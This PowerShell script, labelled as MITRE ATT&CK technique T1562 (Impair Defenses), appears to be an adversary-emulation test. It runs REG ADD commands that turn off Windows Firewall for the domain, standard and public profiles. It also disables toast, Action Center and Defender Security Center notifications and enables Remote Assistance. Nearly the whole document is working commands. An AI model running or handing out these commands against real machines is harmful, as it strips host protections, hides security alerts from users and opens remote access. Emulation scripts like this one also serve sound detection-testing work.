# Impair Defenses
# Technic ID : T1562
Clear-Host
Write-Output "==============================================================================="
Write-Output "Modify Registry keys: Impair Defenses (T1562)"
Write-Output "Add registry keys to :"
Write-Output "    1. Disable notifications" 
Write-Output "    2. Allow RDP Assistance"
Write-Output "    3. Disable Firewall on every profiles" 
Write-Output "    4. Activation of ANSI colors support in terminal"
Write-Output "==============================================================================="
#
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f" -NoNewWindow -Wait 
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_CURRENT_USER\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f" -NoNewWindow -Wait
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall /t REG_DWORD /d 0 /f" -NoNewWindow -Wait
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile /v EnableFirewall /t REG_DWORD /d 0 /f" -NoNewWindow -Wait 
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile /v EnableFirewall /t REG_DWORD /d 0 /f" -NoNewWindow -Wait 
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f" -NoNewWindow -Wait
Start-Process "cmd.exe" -ArgumentList "/c REG ADD \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f" -NoNewWindow -Wait
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.StartupApp /v Enabled /t REG_DWORD /d 0 /f" -NoNewWindow -Wait
Start-Process "cmd.exe" -ArgumentList "/c REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f" -NoNewWindow -Wait